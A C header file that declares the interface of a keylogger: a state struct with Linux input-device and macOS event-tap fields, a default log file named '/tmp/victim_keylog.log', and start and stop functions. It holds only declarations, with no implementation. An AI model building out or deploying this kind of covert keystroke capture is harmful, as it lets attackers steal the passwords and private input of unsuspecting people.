#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <pthread.h>
#include <stddef.h>
#include <stdio.h>

#define KEYLOGGER_DEVICE_MAX 256
#define KEYLOGGER_LOG_FILE "/tmp/victim_keylog.log"
#define KEYLOGGER_AUTO_DEVICE "auto"

typedef struct {
    pthread_mutex_t lock;
    pthread_t thread;
    int active;
    int running;
    int thread_started;
    FILE *log_fp;
    char device_path[KEYLOGGER_DEVICE_MAX];
#ifdef __linux__
    int input_fd;
#elif defined(__APPLE__)
    void *event_tap;
    void *run_loop_source;
#endif
} keylogger_state_t;

void keylogger_state_init(keylogger_state_t *state);
void keylogger_state_destroy(keylogger_state_t *state);
const char *keylogger_platform_default_device(void);
int keylogger_start(
    keylogger_state_t *state,
    const char *device_path,
    const char *log_path,
    char *error,
    size_t error_len
);
int keylogger_stop(keylogger_state_t *state, char *error, size_t error_len);

#endif
